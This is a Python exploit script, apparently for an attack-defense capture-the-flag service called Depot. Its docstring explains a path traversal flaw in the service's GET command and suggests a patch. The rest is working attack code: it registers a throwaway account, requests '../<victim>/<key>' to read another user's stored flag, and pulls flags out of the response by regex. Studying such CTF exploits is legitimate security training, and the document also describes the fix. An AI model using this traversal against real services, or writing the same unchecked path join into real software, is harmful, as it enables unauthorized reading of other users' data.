"""Exploit for the Depot service — path traversal in GET (CWE-22).

Vulnerability: Depot stores values as files BASE/<user>/<key>. PUT sanitizes the
key, but GET interpolates the attacker-controlled key straight into the path with
no validation:

    path = os.path.join(BASE, user, key)   # key unchecked in GET

From our own directory BASE/<attacker>/, a key of "../<victim>/<victimkey>"
resolves to BASE/<victim>/<victimkey> — the victim's flag file. We only need any
freshly registered token and the public flag id, which is exactly "<user>/<key>".

Patch (defense): validate the key in GET with the same `safe_name` helper PUT
already uses (reject "/", "\\", "..", leading "."), or os.path.basename(key) /
realpath-containment (see services/depot/solution.md).

Interface: exploit(host, port, flag_id) -> list[str]   # flag_id = "<user>/<key>"
Deps: stdlib only (raw TCP line protocol).
"""
import random
import re
import socket
import string
import sys

TIMEOUT = 6.0
FLAG_RE = re.compile(r"[A-Z0-9]{31}=")


class _Client:
    def __init__(self, host, port, timeout=TIMEOUT):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.rf = self.sock.makefile("rb")

    def sendline(self, text):
        self.sock.sendall((text + "\n").encode("utf-8"))

    def readline(self):
        line = self.rf.readline()
        if not line:
            raise EOFError("connection closed")
        return line.decode("utf-8", "replace").rstrip("\r\n")

    def close(self):
        for fn in (lambda: self.sock.sendall(b"QUIT\n"), self.rf.close, self.sock.close):
            try:
                fn()
            except Exception:
                pass


def _rand(n=15):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def exploit(host, port, flag_id):
    flags = []
    if flag_id is None:
        return flags                      # need the victim's "<user>/<key>" id
    fid = str(flag_id).strip()
    if "/" not in fid:
        return flags
    victim, key = fid.split("/", 1)
    if not victim or not key:
        return flags

    c = None
    try:
        c = _Client(host, port)
        user = "x" + _rand()
        pw = _rand(16)

        c.sendline("REGISTER %s %s" % (user, pw))
        r = c.readline()
        token = r[3:].strip() if r.startswith("OK ") else None
        if not token:                      # username may be taken -> try AUTH
            c.sendline("AUTH %s %s" % (user, pw))
            r = c.readline()
            token = r[3:].strip() if r.startswith("OK ") else None
        if not token:
            return flags

        # traverse out of our own dir into the victim's: ../<victim>/<key>
        c.sendline("GET %s ../%s/%s" % (token, victim, key))
        r = c.readline()
        if r.startswith("OK "):
            for m in FLAG_RE.findall(r[3:]):
                flags.append(m)
    except Exception:
        return flags
    finally:
        if c is not None:
            c.close()
    return flags


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 5003
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for f in exploit(h, p, fid):
        print(f)
